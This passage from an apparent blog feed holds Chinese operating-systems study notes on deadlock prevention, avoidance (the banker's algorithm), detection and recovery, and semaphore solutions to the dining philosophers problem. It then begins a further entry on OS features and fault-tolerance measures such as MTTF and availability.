/>4、循环等待</td></tr></tbody></table><ul><li><p>处理死锁的方法</p><p>:one:采用某种策略消除条件1～4中的某个条件的出现，来**预防（prevent）**死锁</p><p>:two:基于资源分配的当前状态做动态选择来**避免（avoid）**死锁</p><p>:three:试图**检测（detect）**死锁 （满足条件1～4）的存在并从死锁中恢复</p></li></ul><h1>6.2 死锁预防</h1><ul><li>分类<ul><li><strong>间接</strong>死锁预防方法，即防止前面列出的三个必要条件中的任何一个条件的发生</li><li><strong>直接</strong>死锁预防方法，即<strong>防止循环等待的发生</strong></li></ul></li></ul><p>具体分析与这4个条件相关的技术问题↓</p><h3 id="6-2-1-互斥">6.2.1 互斥</h3><p>不可能禁止，如资源读写的例子</p><h3 id="6-2-2-占有且等待">6.2.2 占有且等待</h3><ul><li>预防占有且等待的条件→可以要求进程<strong>一次性地请求所有需要的资源</strong>，并<strong>阻塞</strong>这个进程直到所有请求都同时满足<ul><li>问题1：低效性<ul><li>一个进程可能<strong>被阻塞很长时间</strong>，以等待满足其所有的资源请求。而实际上，只要有<strong>一部分资源</strong>，它就可以继续执行</li><li>分配给一个进程的资源<u>可能会在相当长的一段时间</u><strong>不会被该进程使用</strong>，且不能被其他进程使用</li></ul></li><li>问题2：一个进程可能<strong>事先并不知道</strong>它所需要的所有资源</li></ul></li></ul><h3 id="6-2-3-不可抢占">6.2.3 不可抢占</h3><p>1、占有某些资源的一个进程进一步申请资源时若<strong>被拒绝</strong>，则该进程必须<strong>释放</strong>其最初占有的资源，必要时<strong>可再次申请</strong>这些资源和其他资源</p><p>2、一个进程请求当前被另一个进程占有的一个资源时，<strong>操作系统可以抢占另一个进程</strong>，要求它释放资源（条件：任意两个进程的优先级都不同）</p><p>[只有在<strong>资源状态</strong>可以<strong>很容易地保存和恢复</strong>的情况下（就像处理器一样），这种方法才是实用的]</p><h3 id="6-2-4-循环等待">6.2.4 循环等待</h3><ul><li>循环等待条件可通过<strong>定义资源类型的线性顺序</strong>来预防<ul><li>若一个进程<strong>已分配了R类型的资源</strong>，则其接下来请求的资源只能是那些<strong>排在R类型之后的资源</strong></li><li>假设两个进程A和B死锁，原因是A获得R~j~，并请求R~i~，而B获得R~i~，并请求R~j~，那么这个条件不可能，因为这意味着i&lt;j且 j&lt;i</li></ul></li><li>低效性：会使进程<strong>执行速度变慢</strong>，且可能在<strong>没有必要的情况下拒绝资源访问</strong></li></ul><h1>6.3 死锁避免</h1><ul><li>和死锁预防的差别很小<ul><li>在死锁预防（deadlock prevention）中，约束资源请求至少可<strong>破坏四个死锁条件中的一个条件</strong>。这可通过<u>防止发生三个必要条件中的一个</u>（互斥、占有且等待、非抢占）<strong>间接完成</strong>，也可通过<u>防止循环等待</u><strong>直接完成</strong>，但都会导致<strong>低效的资源使用</strong>和<strong>低效的进程执行</strong></li><li>死锁避免则相反：允许三个必要条件，但通过明智地选择，可确保永远<u>不会到达死锁点</u>，因此死锁避免与死锁预防<u>相比</u>，<strong>可允许更多的并发</strong></li></ul></li><li>在死锁避免中<u>，是否允许当前的资源分配请求</u>是通过判断该请求是否可能导致死锁来决定的→死锁避免需要知道<strong>未来进程资源请求的情况</strong></li><li>两种死锁避免方法<ul><li>若<strong>一个进程的请求</strong>会导致死锁，则<strong>不启动</strong>该进程</li><li>若一个进程<strong>增加的资源请求</strong>会导致死锁，则<strong>不允许这一资源分配</strong></li></ul></li></ul><h3 id="6-3-1-进程启动拒绝">6.3.1 进程启动拒绝</h3><ul><li>有着n个进程和m种不同类型资源的系统</li></ul><table><thead><tr><th>定义</th><th>说明</th></tr></thead><tbody><tr><td>Resource=<strong>R</strong>=(R~1~,R~2~,…,R~m~)</td><td>系统中每种资源的总量</td></tr><tr><td>Available =Available =<strong>V</strong>=(V~1~,V~2~,…,V~m~)</td><td>未分配给进程的每种资源的总量</td></tr><tr><td>$$Claim=C=\left[\begin{matrix}C{11}&amp;C{12}&amp;…C{1m}\C{21}&amp;C{22}&amp;…C{2m}\…&amp;…&amp;…\C{n1}&amp;C{n2}&amp;…C{nm}\end{matrix}\right]\tag{2}$$</td><td>C~ij~=进程 i 对资源 j 的需求</td></tr><tr><td>$$Allocation=A=\left[\begin{matrix}A~11~&amp;A~12~&amp;…A~1m~\A~21~&amp;A~22~&amp;…A~2m~\…&amp;…&amp;…\A~n1~&amp;A~n2~&amp;…A~nm~\end{matrix}\right]\tag{2}$$</td><td>A~ij~= 当前分配给进程 i 的资源 j</td></tr></tbody></table><ul><li><p>定义一个死锁避免策略：若一个新进程的资源需求会导致死锁，则<strong>拒绝启动</strong>这个新进程</p></li><li><p>启动一个新进程 P~n+1~的条件：$$R~j~ ≥ C~(n+1)j~ + \sum_{i=1}^{n}{C_(ij)}$$</p></li><li><p>这个策略不是最优的，因为它假设了最坏的情况：所有进程同时发出它们的最大请求</p></li></ul><h3 id="6-3-2-资源分配拒绝">6.3.2 资源分配拒绝</h3><ul><li><p>资源分配拒绝策略，又称为<strong>银行家算法（banker algorithm）</strong>，需要定义<strong>状态</strong>和<strong>安全状态</strong>的概念</p></li><li><p>系统的状态是当前给进程分配的资源情况，状态包含两个向量Resource 和 Available 及两个矩阵Claim 和 Allocation</p></li><li><p><strong>安全状态（safe state）</strong>：<u>至少有一个</u><strong>资源分配序列</strong>不会导致死锁（即所有进程<u>都能运行直到结束</u>）</p></li><li><p>安全状态的确定</p><img src="/2024/02/20/%E7%AC%AC%E5%85%AD%E7%AB%A0%E5%B9%B6%E5%8F%91%EF%BC%9A%E6%AD%BB%E9%94%81%E5%92%8C%E9%A5%A5%E9%A5%BF/os6.1.jpg" class=""><ul><li>由上图可判断每个进程都可以运行到结束，所以（a）定义的状态是一个安全状态</li></ul></li><li><p>进程请求一组资源时，假设同意该请求，因此改变了系统的状态，然后确定结果是否仍处于安全状态。如果是，同意这个请求；如果不是，阻塞该进程直到同意该请求后系统状态仍然是安全的</p><p>→能确保系统中的进程和资源总处于安全状态</p></li><li><p>不安全状态</p><img src="/2024/02/20/%E7%AC%AC%E5%85%AD%E7%AB%A0%E5%B9%B6%E5%8F%91%EF%BC%9A%E6%AD%BB%E9%94%81%E5%92%8C%E9%A5%A5%E9%A5%BF/os6.2.jpg" class=""><ul><li><p>假设P1请求另外一个R1单元和R3单元。每个进程至少需要一个额外的 R1 单元，但现在没有</p><p>一个可用的 R1单元→基于死锁避免的原则，P1的请求将被<strong>拒绝</strong>并且P1将<strong>被阻塞</strong></p></li><li><p>注意：上图并不处于死锁状态，仅有死锁的可能</p><ul><li>若P1 从这一状态开始运行，先释放一个R1单元和一个R3单元，后来再次需要这些资源，则系统将达到安全状态</li><li>:star:→死锁避免策略并<strong>不能确切地预测死锁</strong>，它仅是<strong>预料死锁的可能性</strong>并<strong>确保永远不会出现这种可能性</strong></li></ul></li></ul></li><li><p>对死锁避免逻辑的抽象描述</p><p>1、全局数据结构</p><p>数据结构state定义了系统状态</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">truct state&#123;<br>    <span class="hljs-type">int</span> resource [m] ;<br>    <span class="hljs-type">int</span> available [m]; <br>    <span class="hljs-type">int</span> claim [n][m];<br>    <span class="hljs-type">int</span> alloc [n] [m];<br>&#125;<br></code></pre></td></tr></table></figure><p>2、 资源分配算法(算法的主体)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (alloc[i,*] + request[*] &gt; claim[i,*])<br>&lt;error&gt;;    <span class="hljs-comment">/* total request &gt; claim*/</span><br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (request[*] &gt; available[*])<br>&lt;suspend procesS&gt;; <br><span class="hljs-keyword">else</span>&#123;<span class="hljs-comment">/* simulate alloc */</span> <br>    &lt;define newstate by;<br>    alloc[i,*]= alloc[i,*]+ request [*]; <br>    available [*]= available [*]request[*]&gt;;<br>&#125;<br><br><span class="hljs-keyword">if</span>(safe(newstate))<br>    &lt;carry out allocation&gt;;<br><span class="hljs-keyword">else</span>&#123;<br>&lt;restore original state&gt;; <br>    &lt;suspend process&gt;;<br>&#125;<br></code></pre></td></tr></table></figure><p>①进行一次检测，确保该请求<u>不会超过进程最初声明的要求</u></p><p>②若该请求有效，则下一步确定是否能实现这一请求（即是否有足够的可用资源）</p><p>若没有，则阻塞该进程</p><p>③资源被暂时分配给进程i以形成一个newstate：确定完成这个请求是否安全</p><p>④测试安全性↓</p><p>3、测试安全算法（银行家算法）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c">boolean <span class="hljs-title function_">safe</span><span class="hljs-params">(state S)</span>&#123;<br>    <span class="hljs-type">int</span> currentavail[m];<br>    process rest[&lt;number of processes&gt;]; <br>    Currentavail = available;<br>    rest =&#123;ali processes&#125;; <br>    possible = <span class="hljs-literal">true</span>;<br>    <span class="hljs-keyword">while</span> (possible)&#123;<br>        &lt;find a process Pk in rest such that claim [k,*]- alloc [k,*&lt;=currentavail;                       <br><span class="hljs-keyword">if</span>(found)&#123; <span class="hljs-comment">/* simulate execution of Pk */</span><br>            currentavail= currentavail + alloc [k,*];<br>            rest = rest - &#123;Pk&#125;;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            possible = <span class="hljs-literal">false</span>;<br>        &#125;<br>                                                                 &#125;<br><span class="hljs-keyword">return</span> (rest == null);<br>                                                                 &#125;<br></code></pre></td></tr></table></figure></li><li><p>死锁避免的优点</p><ul><li>无须<u>死锁预防</u>中的<u>抢占</u>和<u>回滚</u>进程，且与死锁预防相比<strong>限制较少</strong></li></ul></li><li><p>缺点：在使用中也有许多限制</p><ul><li>必须<strong>事先声明</strong>每个进程请求的<strong>最大资源</strong></li><li>所讨论的进程必须是<strong>无关</strong>的，即它们的执行顺序必须<strong>没有任何同步要求的限制</strong></li><li>分配的资源数量必须是<strong>固定</strong>的</li><li>在占有资源时，进程<strong>不能退出</strong></li></ul></li></ul><h1>6.4 死锁检测</h1><ul><li><strong>死锁预防策略</strong>非常<strong>保守</strong>，它们通过<strong>限制访问资源</strong>和<strong>在进程上强加约束</strong>来解决死锁问题</li><li>死锁检测策略则完全相反，它<strong>不限制</strong>资源访问或约束进程行为。对于死锁检测（deadlock detection）来说，只要有可能，就会给进程分配其所请求的资源。操作系统<strong>周期性</strong>地执行一个算法来检测前面的条件（4），即<strong>循环等待条件</strong></li></ul><h3 id="6-4-1-死锁检测算法">6.4.1 死锁检测算法</h3><ul><li><p>使用Allocation 矩阵和Available 向量。还定义了一个请求矩阵<strong>Q</strong>，其中Q~ij~，表示进程 i 请求的 j 类资源的数量</p></li><li><p>算法主要是一个标记未死锁进程的过程：</p><p>1、记 Allocation矩阵中<strong>一行全为零</strong>的进程。</p><p>2、初始化一个临时向量<strong>W</strong>，令<strong>W</strong><u>等于Available向量</u></p><p>3、查找下标 i，使进程 i <u>当前未标记</u>且<strong>Q</strong>的<u>第 i 行小于等于<strong>W</strong></u>，即对所有的1≤k≤m，Q~ik~≤W~k~。若找不到这样的行，终止算法</p><p>4、若找到这样的行，<u>标记</u>进程 i，并把 Allocation 矩阵中的<u>相应行加到 W</u> 中，即对所有的1≤k≤m，令W~k~=W~k~+A~ik~，返回步骤3</p></li><li><p><u>当且仅当</u>这个算法的<u>最终结果有未标记的进程</u>时，才<strong>存在死锁</strong>，每个<u>未标记的进程</u>都是死锁的</p></li><li><p>策略：</p><p>查找一个进程，使得可用资源能满足该进程的资源请求，然后假设同意这些资源，让该进程运行直到结束，再释放它的所有资源</p><p>然后，算法再寻找另一个可以满足资源请求的进程</p><p>注意：该算法<strong>不能保证防止死锁</strong>，是否死锁<strong>取决于将来同意请求的次序</strong>，它所做的一切是<strong>确定当前</strong></p><p><strong>是否存在死锁</strong></p></li><li><p>示例</p><img src="/2024/02/20/%E7%AC%AC%E5%85%AD%E7%AB%A0%E5%B9%B6%E5%8F%91%EF%BC%9A%E6%AD%BB%E9%94%81%E5%92%8C%E9%A5%A5%E9%A5%BF/os6.3.jpg" class=""><p>1、由于P4<u>没有已分配的资源</u>，标记 P4</p><p>2、令= W =（ 0 0 0 0 1）</p><p>3、进程P3的请求<u>小于等于</u>W，因此标记P3，并令W = W +（0 0 0 1 0）=（0 0 0 1 0）</p><p>4、不存在其他未标记进程在Q中的行小于等于W，因此终止算法</p><p>→结果：P1和 P2未标记，表明这两个进程是死锁的</p></li></ul><h3 id="6-4-2-恢复">6.4.2 恢复</h3><ul><li><p>可能的方法(复杂度递增)</p><p>1、<strong>取消所有</strong>的死锁进程。这是操作系统中<strong>最常采用</strong>的方法</p><p>2、 把每个死锁进程<strong>回滚</strong>到前面定义的某些检查点，并<strong>重新启动</strong>所有进程</p><ul><li>要求在系统中构建回滚和重启机制</li><li>风险：原来的死锁<strong>可能再次发生</strong>。但是，并发进程的<strong>不确定性</strong>通常能保证不会发生这种情况</li></ul><p>3、<strong>连续取消死锁进程</strong>直到不再存在死锁</p><ul><li>所选取消进程的顺序应<strong>基于某种最小代价原则</strong></li><li>在每次取消后，必须<strong>重新调用检测算法</strong>，以测试是否仍存在死锁。</li></ul><p>4、<strong>连续抢占资源</strong>直到不再存在死锁</p><ul><li>需要使用一种<strong>基于代价的选择方法</strong></li><li>需要在每次抢占后<strong>重新调用检测算法</strong>。一个<u>资源被抢占的进程</u>必须<strong>回滚</strong>到<u>获得这个资源之前</u>的某一状态</li></ul></li><li><p>对于3、4，选择原则采取如下之一</p><ul><li>目前为止<strong>消耗的处理器时间</strong>最少</li><li>目前为止<strong>产生的输出</strong>最少</li><li>预计<strong>剩下的时间</strong>最长（最值得怀疑）</li><li>目前为止<strong>分配的资源总量</strong>最少</li><li><strong>优先级最低</strong></li></ul><p>（除优先级测度外，相对于整个系统的代价而言，其他原则对用户而言没有任何代价）</p></li></ul><h1>6.5 一种综合的死锁策略</h1><ul><li>在不同情况下使用不同的策略<ul><li>把资源分成几组<strong>不同的资源类</strong><ul><li><strong>可交换空间</strong>∶进程交换所用<strong>外存中的存储块</strong></li><li><strong>进程资源</strong>∶<strong>可分配的设备</strong>，如磁带设备和文件</li><li><strong>内存</strong>∶可按页或按段分配给进程</li><li><strong>内部资源</strong>∶诸如 <strong>I/O通道</strong></li></ul></li><li>为预防在资源类之间由于循环等待产生死锁，可使用前面定义的<strong>线性排序策略</strong></li><li>在一个资源类中，使用该类资源最适合的算法<ul><li>可交换空间<ul><li>要求一次性分配所有请求的资源来预防死锁，就像占有等待预防策略一样</li><li>若知道最大存储需求（通常情况下都知道），则这个策略是合理的，死锁避免也是可能的</li></ul></li><li>进程资源<ul><li>对于这类资源，<strong>死锁避免</strong>策略通常是很有效的，因为进程可以事先声明它们需要的这类资源</li><li>采用<strong>资源排序的预防策略</strong>也是可能的</li></ul></li><li>内存<ul><li>对于内存，<strong>基于抢占的预防</strong>是最适合的策略。当一个进程被抢占后，它仅被换到外存，释放空间以解决死锁</li></ul></li><li>内部资源<ul><li>可以使用<strong>基于资源排序的预防策略</strong></li></ul></li></ul></li></ul></li></ul><h1>6.6 哲学家就餐问题</h1><img src="/2024/02/20/%E7%AC%AC%E5%85%AD%E7%AB%A0%E5%B9%B6%E5%8F%91%EF%BC%9A%E6%AD%BB%E9%94%81%E5%92%8C%E9%A5%A5%E9%A5%BF/os6.4.jpg" class=""><ul><li><p>一张圆桌上有一大碗面和5个盘子，每位哲学家一个盘子， 还有5把叉子。每位想吃饭的哲学家将坐到桌子旁分配给他的位置上，使用盘子两侧的叉子，取面和吃面</p></li><li><p>问题∶设计一套哲学家吃饭的礼仪（算法）。算法必须保证<strong>互斥</strong>（两位哲学家<u>不能同时使</u></p><p><u>用同一把叉子</u>），同时还要<strong>避免死锁和饥饿</strong>（此时，饥饿的字面含义和算法中的含义相同）。</p></li></ul><h3 id="6-6-1-基于信号量的解决方案">6.6.1 基于信号量的解决方案</h3><p>:one:</p><p>1、不正确</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* program diningphiloSopherg */</span><br>gemaphore fork[<span class="hljs-number">5</span>] =&#123;<span class="hljs-number">1</span>&#125;;<br><span class="hljs-type">int</span> i;<br><span class="hljs-type">void</span> <span class="hljs-title function_">philosopher</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>&#123;<br>    <span class="hljs-keyword">while</span>(<span class="hljs-literal">true</span>)&#123;<br>        think();<br>        wait(fork[i]);<br>        wait (fork [(i+<span class="hljs-number">1</span>) mod <span class="hljs-number">5</span>]);<br>        eat();<br>        signal(fork [(i+<span class="hljs-number">1</span>) mod <span class="hljs-number">5</span>]);<br>        signal(fork[i]);<br>    &#125;<br>&#125;<br>                     <br><span class="hljs-type">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    parbegin(philosopher(<span class="hljs-number">0</span>),philosopher(<span class="hljs-number">1</span>),<br>philosopher (<span class="hljs-number">2</span>), philosopher (<span class="hljs-number">3</span>),<br>philosopher (<span class="hljs-number">4</span>));<br>&#125;<br></code></pre></td></tr></table></figure><p>每位哲学家首先拿起左边的叉子，然后拿起右边的叉子。在哲学家吃完面后，这两把叉子又被放回到餐桌上</p><p>→导致死锁∶如果所有哲学家在同一时刻都感到饥饿，都拿起左边的叉子，都伸手拿右边的叉子，但都没有拿到</p><p>2、考虑增加一位服务员，他/她只允许4位哲学家同时进入餐厅，由于最多有4位哲学家就座，因而至少有一位哲学家可以拿到两把叉子→不会发生死锁和饥饿</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* program diningphilosophers */</span><br>semaphore fork [<span class="hljs-number">5</span>]= &#123;<span class="hljs-number">1</span>&#125;；<br>semaphore room =&#123;<span class="hljs-number">4</span>&#125;; <br><span class="hljs-type">int</span> i;<br>                 <br><span class="hljs-type">void</span> <span class="hljs-title function_">philosopher</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>&#123;<br>    <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>)&#123;<br>        think();<br>        wait (room);<br>        wait (fork[i]);<br>        wait(fork [(i+<span class="hljs-number">1</span>)mod <span class="hljs-number">5</span>]);<br>        eat();<br>        signal(fork[(i+<span class="hljs-number">1</span>)mod <span class="hljs-number">5</span>]);<br>        signal(fork[i]);<br>        signal(room);<br>    &#125;<br>&#125;<br>                 <br>vod <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    parbegin(philosopher (<span class="hljs-number">0</span>),philosopher (<span class="hljs-number">1</span>),<br>        philosopher((<span class="hljs-number">2</span>),philosopher(<span class="hljs-number">3</span>),<br>        philosopher (<span class="hljs-number">4</span>));<br>              &#125;<br></code></pre></td></tr></table></figure><p>:two:一次拿起两双筷子</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c">semphore mutex=<span class="hljs-number">1</span><br>semphore philosopher[<span class="hljs-number">5</span>]=<span class="hljs-number">1</span><br>    <br>Void philosopher(<span class="hljs-type">int</span> i)<br>&#123;<br>    think();<br>    semwait(mutex);<br>    semwait(i%<span class="hljs-number">5</span>);<br>    semwait((i+<span class="hljs-number">1</span>)%<span class="hljs-number">5</span>);<br>    semsignal(mutex);<br>    eat();<br>    semsignal(i%<span class="hljs-number">5</span>);<br>    semsignal((i+<span class="hljs-number">1</span>)%<span class="hljs-number">5</span>);<br>&#125;<br><br></code></pre></td></tr></table></figure><p>:three:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c">Semaphore fork[<span class="hljs-number">5</span>]=<span class="hljs-number">1</span>;<br>Semamphore s1=<span class="hljs-number">0</span>,s2=<span class="hljs-number">0</span>;<br><span class="hljs-type">int</span> i；<br>    <br>Void <span class="hljs-title function_">philosopher</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span><br>&#123;<br><span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>)<br>&#123;<br>        think();<br>        <span class="hljs-keyword">if</span> ((i mod <span class="hljs-number">5</span>)==<span class="hljs-number">1</span>)<br>            semwait(s1);<br><span class="hljs-keyword">if</span>((i mod <span class="hljs-number">5</span>)==<span class="hljs-number">4</span>)<br>semwait(s2);<br>semwait(fork[i]);<br>semwait(fork[(i+<span class="hljs-number">1</span>)mod5]);<br>    &#125;<br>eat();<br>semsignal(fork[i]);<br>semsignal(fork[(i+<span class="hljs-number">1</span>)mod <span class="hljs-number">5</span>]);<br><span class="hljs-keyword">if</span> ((i mod <span class="hljs-number">5</span>)==<span class="hljs-number">0</span>)<br>    &#123;<br>        semsignal(s1);<br>        semsignal(s2);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>:three:动态避免</p>]]></content>
    
    
    <categories>
      
      <category>操作系统</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>第二章-操作系统概述（二）</title>
    <link href="/2024/02/20/%E7%AC%AC%E4%BA%8C%E7%AB%A0%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%BF%B0%EF%BC%88%E4%B8%8B%EF%BC%89/"/>
    <url>/2024/02/20/%E7%AC%AC%E4%BA%8C%E7%AB%A0%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%BF%B0%EF%BC%88%E4%B8%8B%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<p>2.4现代操作系统的特征</p><ul><li>多数操作系统都只有一个<strong>单体内核（<em>monolithic kernel</em>）</strong>，操作系统应提供的多数功能都由这个大内核来提供，典型情况下，这个大内核是作为一个<strong>进程</strong>实现的，<strong>所有元素</strong>都<strong>共享相同的地址空间</strong></li><li><strong>微内核体系结构（<em>microkernel architecture</em>）<strong>只给</strong>内核</strong>分配一些<strong>最基本的功能</strong>，包括地址空间、进程间通信（<em>IPC，Inter Process Communication</em>）、基本的调度。其他操作系统服务由运行在用户模式且与其他应用程序类似的<strong>进程</strong>提供，这些进程可根据特定的应用和环境需求进行定制，有时也称这些进程为<strong>服务器</strong></li><li>微内核方法可使系统结构的设计更加简单、灵活，非常适合于<strong>分布式环境</strong></li><li><strong>多线程（<em>multithreading</em>）<strong>技术：把一个应用程序的</strong>进程</strong>划分为可以<strong>同时运行</strong>的多个<strong>线程</strong></li><li>线程和进程的区别：<ul><li>线程<ul><li>可分派的工作单元</li><li>包括处理器<strong>上下文环境</strong>（包括程序计数器和栈指针）和<strong>栈中自身的数据区域</strong>（目的是启用子程序分支</li><li>线程<strong>顺序执行</strong>且<strong>可以中断</strong>，因此处理器可以转到另一个线程</li></ul></li><li>进程<ul><li>一个或多个<strong>线程</strong>和<strong>相关资源</strong>（如包含数据和代码的存储器空间、打开的文件和设备）的<strong>集合</strong></li><li>严格对应于一个正在执行的程序的概念</li></ul></li></ul></li><li><strong>对称多处理（<em>SMP，Symmetric MultiProcessing</em>）</strong><ul><li>不仅指<strong>计算机硬件体系结构</strong>，也指采用该系统结构的<strong>操作系统行为</strong></li><li>对称多处理系统可调度进程或线程到<strong>所有的处理器</strong>上运行</li></ul></li></ul><h1>2.5容错性</h1><ul><li>指系统或部件在发生软/硬件错误时，能够继续正常运行的能力，这种能力通常会涉及到一定程度的冗余</li><li>旨在提高系统的可靠性</li></ul><h5 id="2-5-1基本概念">2.5.1基本概念</h5><ul><li><p>可靠性R(t)：从t‘=0~t‘=t时刻系统正确运行的概率</p><ul><li>“正确运行”：一系列程序正常运行，并保护数据不被意外地修改</li></ul></li><li><p>平均失效时间MTTF</p><ul><li><p class="katex-block "><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mtext>平均失效时间</mtext><mi>M</mi><mi>T</mi><mi>T</mi><mi>F</mi><mo>=</mo><msubsup><mo>∫</mo><mn>0</mn><mi mathvariant="normal">∞</mi></msubsup><mi>R</mi><mo stretchy="false">(</mo><mi>t</mi><mo stretchy="false">)</mo><mi>d</mi><mi>t</mi></mrow><annotation encoding="application/x-tex">平均失效时间MTTF=\int_0^∞ R(t)dt</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord cjk_fallback">平均失效时间</span><span class="mord mathnormal" style="margin-right:0.13889em;">MTTF</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:2.3262em;vertical-align:-0.9119em;"></span><span class="mop"><span class="mop op-symbol large-op" style="margin-right:0.44445em;position:relative;top:-0.0011em;">∫</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.4143em;"><span style="top:-1.7881em;margin-left:-0.4445em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span><span style="top:-3.8129em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">∞</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9119em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mopen">(</span><span class="mord mathnormal">t</span><span class="mclose">)</span><span class="mord mathnormal">d</span><span class="mord mathnormal">t</span></span></span></span></span></p></li><li><p><strong>平均修复时间（MTTR）</strong>：<strong>修复或替换</strong>错误部分所花费的<strong>平均时间</strong></p><img src="/2024/02/20/%E7%AC%AC%E4%BA%8C%E7%AB%A0%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%BF%B0%EF%BC%88%E4%B8%8B%EF%BC%89/os2.13.jpg" class=""></li></ul></li><li><p>系统或服务的<strong>可用性（<em>availability</em>）</strong></p><ul><li>系统能够有效服务用户请求的时间段</li><li>系统不可用的时间称为<strong>宕机时间（<em>downtime</em>）</strong>，系统可用的时间称为<strong>正常运行时间（<em>uptime</em>）</strong></li><li><p class="katex-block "><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mtext>一个系统的可用性</mtext><mi>A</mi><mo>=</mo><mfrac><mrow><mi>M</mi><mi>T</mi><mi>T</mi><mi>F</mi></mrow><mrow><mi>M</mi><mi>T</mi><mi>T</mi><mi>F</mi><mo>+</mo><mi>M</mi><mi>T</mi><mi>T</mi><mi>R</mi></mrow></mfrac></mrow><annotation encoding="application/x-tex">一个系统的可用性A=\frac{MTTF}{MTTF+MTTR}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord cjk_fallback">一个系统的可用性</span><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" 